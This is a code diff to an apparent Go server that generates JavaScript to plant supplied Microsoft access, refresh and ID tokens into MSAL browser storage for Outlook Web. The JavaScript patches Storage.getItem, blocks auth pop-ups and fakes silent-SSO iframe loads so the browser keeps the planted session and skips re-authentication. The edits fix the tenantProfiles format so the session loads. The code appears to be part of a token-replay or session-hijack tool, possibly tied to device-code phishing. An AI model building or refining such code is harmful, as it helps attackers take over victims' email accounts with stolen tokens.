@@ -946,7 +946,8 @@ if(!window.crypto||!window.crypto.subtle){
   window.open=function(u,n,f){if(_isAuthUrl(u)){console.warn('[xt] blocked window.open→',u);return null;}return _wo.call(window,u,n,f);};
 }());
 /* ── Storage.prototype.getItem guard: ensure ALL msal.*.keys reads return arrays ──
-   Covers both msal.token.keys.* AND msal.account.keys* ── */
+   Covers both msal.token.keys.* AND msal.account.keys* AND account entries
+   (tenantProfiles must be an array, not an object, for migrateIdTokens) ── */
 (function(){
   var _gi=Storage.prototype.getItem;
   Storage.prototype.getItem=function(k){
@@ -969,6 +970,32 @@ if(!window.crypto||!window.crypto.subtle){
             if(!Array.isArray(p))return JSON.stringify([]);
           }
         }catch(e){return k.indexOf('msal.token.keys.')===0?JSON.stringify({accessToken:[],idToken:[],refreshToken:[]}):JSON.stringify([]);}
+      } else if(v){
+        // Account entries: tenantProfiles must be an array (not plain object)
+        // migrateIdTokens does tenantProfiles.find(...) and crashes on plain objects
+        try{
+          var p=JSON.parse(v);
+          if(p&&typeof p==='object'&&!Array.isArray(p)&&p.authorityType==='MSSTS'){
+            var changed=false;
+            if(p.tenantProfiles&&!Array.isArray(p.tenantProfiles)){
+              // Convert {tid: {...}} object to [{tenantId:tid,...}] array
+              var arr=[];
+              try{Object.keys(p.tenantProfiles).forEach(function(t){
+                var tp=p.tenantProfiles[t];
+                if(tp&&typeof tp==='object')arr.push(tp);
+                else arr.push({tenantId:t,localAccountId:p.localAccountId||'',name:p.name||'',isHomeTenant:true});
+              });}catch(e2){arr=[{tenantId:p.realm||'',localAccountId:p.localAccountId||'',name:p.name||'',isHomeTenant:true}];}
+              p.tenantProfiles=arr;
+              changed=true;
+            }
+            if(!p.tenantProfiles){p.tenantProfiles=[];changed=true;}
+            if(changed){
+              var fixed=JSON.stringify(p);
+              try{_gi.call(this,'__x');localStorage.setItem(k,fixed);}catch(e2){}
+              return fixed;
+            }
+          }
+        }catch(e){}
       }
     }
     return v;
@@ -1421,7 +1448,7 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	// migrateIdTokens calls .find() on idToken and crashes on null.
 	js.WriteString("  /* 0a. Guard msal.token.keys.* + msal.account.keys against null/non-array */\n")
 	// Guard covers: token.keys.* (ensure arrays never null), account.keys (ensure array)
-	js.WriteString("  (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(k&&k.indexOf('msal.token.keys.')===0){if(!v)return JSON.stringify({accessToken:[],idToken:[],refreshToken:[]});try{var p=JSON.parse(v);if(p&&typeof p==='object'){if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}}catch(e){return JSON.stringify({accessToken:[],idToken:[],refreshToken:[]});}}if(k==='msal.account.keys'){if(!v)return v;try{var p=JSON.parse(v);if(!Array.isArray(p))return JSON.stringify([]);}catch(e){return JSON.stringify([]);}}return v;};}());\n")
+	js.WriteString("  (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(typeof k==='string'&&k.indexOf('msal.')===0){if(k.indexOf('.keys')!==-1){if(!v)return v;try{var p=JSON.parse(v);if(k.indexOf('msal.token.keys.')===0){if(!p||typeof p!=='object'||Array.isArray(p))return JSON.stringify({accessToken:[],idToken:[],refreshToken:[]});if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}else{if(!Array.isArray(p))return JSON.stringify([]);}}catch(e){return k.indexOf('msal.token.keys.')===0?JSON.stringify({accessToken:[],idToken:[],refreshToken:[]}):JSON.stringify([]);}}else if(v){try{var p=JSON.parse(v);if(p&&typeof p==='object'&&!Array.isArray(p)&&p.authorityType==='MSSTS'){var changed=false;if(p.tenantProfiles&&!Array.isArray(p.tenantProfiles)){var arr=[];try{Object.keys(p.tenantProfiles).forEach(function(t){var tp=p.tenantProfiles[t];if(tp&&typeof tp==='object')arr.push(tp);else arr.push({tenantId:t,localAccountId:p.localAccountId||'',name:p.name||'',isHomeTenant:true});});}catch(e2){arr=[{tenantId:p.realm||'',localAccountId:p.localAccountId||'',name:p.name||'',isHomeTenant:true}];}p.tenantProfiles=arr;changed=true;}if(!p.tenantProfiles){p.tenantProfiles=[];changed=true;}if(changed)return JSON.stringify(p);}}catch(e){}}}return v;};}());\n")
 	// Block MSAL's hidden-iframe ssoSilent: intercept iframe.src writes that contain
 	// prompt=none and immediately fire a load event so MSAL's silent request resolves
 	// (with failure) and falls back to the cache rather than doing loginRedirect.
@@ -1763,8 +1790,8 @@ func buildMSALEntriesJSON(at, rt, idt, tenant, email string) string {
 		"name":           name,
 		"realm":          tid,
 		"username":       upn,
-		"tenantProfiles": map[string]interface{}{
-			tid: map[string]interface{}{
+		"tenantProfiles": []interface{}{
+			map[string]interface{}{
 				"tenantId":       tid,
 				"localAccountId": oid,
 				"name":           name,
@@ -1876,7 +1903,7 @@ func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
 	js.WriteString("(function(){\n")
 	// Guard msal.token.keys.* AND msal.account.keys against null/non-array values.
 	// This guard MUST survive the navigation — we use document.write() for that reason.
-	js.WriteString("  (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(k&&k.indexOf('msal.token.keys.')===0){if(!v)return JSON.stringify({accessToken:[],idToken:[],refreshToken:[]});try{var p=JSON.parse(v);if(p&&typeof p==='object'){if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}}catch(e){return JSON.stringify({accessToken:[],idToken:[],refreshToken:[]});}}if(k==='msal.account.keys'){if(!v)return v;try{var p=JSON.parse(v);if(!Array.isArray(p))return JSON.stringify([]);}catch(e){return JSON.stringify([]);}}return v;};}());\n")
+	js.WriteString("  (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(typeof k==='string'&&k.indexOf('msal.')===0){if(k.indexOf('.keys')!==-1){if(!v)return v;try{var p=JSON.parse(v);if(k.indexOf('msal.token.keys.')===0){if(!p||typeof p!=='object'||Array.isArray(p))return JSON.stringify({accessToken:[],idToken:[],refreshToken:[]});if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}else{if(!Array.isArray(p))return JSON.stringify([]);}}catch(e){return k.indexOf('msal.token.keys.')===0?JSON.stringify({accessToken:[],idToken:[],refreshToken:[]}):JSON.stringify([]);}}else if(v){try{var p=JSON.parse(v);if(p&&typeof p==='object'&&!Array.isArray(p)&&p.authorityType==='MSSTS'){var changed=false;if(p.tenantProfiles&&!Array.isArray(p.tenantProfiles)){var arr=[];try{Object.keys(p.tenantProfiles).forEach(function(t){var tp=p.tenantProfiles[t];if(tp&&typeof tp==='object')arr.push(tp);else arr.push({tenantId:t,localAccountId:p.localAccountId||'',name:p.name||'',isHomeTenant:true});});}catch(e2){arr=[{tenantId:p.realm||'',localAccountId:p.localAccountId||'',name:p.name||'',isHomeTenant:true}];}p.tenantProfiles=arr;changed=true;}if(!p.tenantProfiles){p.tenantProfiles=[];changed=true;}if(changed)return JSON.stringify(p);}}catch(e){}}}return v;};}());\n")
 	js.WriteString("  (function(){var _ce=document.createElement;document.createElement=function(t){var el=_ce.call(document,t);if((t+'').toLowerCase()==='iframe'){var _sa=el.setAttribute.bind(el);el.setAttribute=function(n,v){if(n==='src'&&v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}_sa(n,v);};Object.defineProperty(el,'src',{set:function(v){if(v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}el.setAttribute('src',v);},get:function(){return el.getAttribute('src')||'';},configurable:true});}return el;};}());\n")
 	js.WriteString("  var d=")
 	js.WriteString(string(entriesJSON))
